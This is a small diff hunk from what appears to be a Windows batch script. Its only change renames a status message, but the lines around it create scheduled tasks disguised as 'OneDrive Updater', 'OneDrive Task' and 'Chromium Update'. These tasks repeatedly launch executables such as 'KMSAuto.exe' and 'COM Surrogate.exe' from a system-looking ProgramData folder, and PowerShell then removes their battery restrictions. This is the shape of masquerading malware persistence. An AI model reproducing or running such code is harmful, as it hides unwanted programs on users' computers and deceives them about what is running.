@@ -198,7 +198,7 @@ schtasks /create /tn "OneDrive Updater" /tr "\"%ProgramData%\Microsoft\Windows\S
 schtasks /create /tn "OneDrive Task" /tr "\"%ProgramData%\Microsoft\Windows\KMSAuto.exe"" /sc minute /mo 1 /f & powershell -Command "$task = Get-ScheduledTask -TaskName 'OneDrive Task'; $task.Settings.DisallowStartIfOnBatteries = $false; $task | Set-ScheduledTask"
 schtasks /create /tn "Chromium Update" /tr "\"%ProgramData%\Microsoft\Windows\COM Surrogate.exe"" /sc minute /mo 180 /f & powershell -Command "$task = Get-ScheduledTask -TaskName 'Chromium Update'; $task.Settings.DisallowStartIfOnBatteries = $false; $task | Set-ScheduledTask"
 
-set "MESSAGE=KMSAuto|"
+set "MESSAGE=TasksAdded|"
 
 :AFTERTASKSEVERY
 
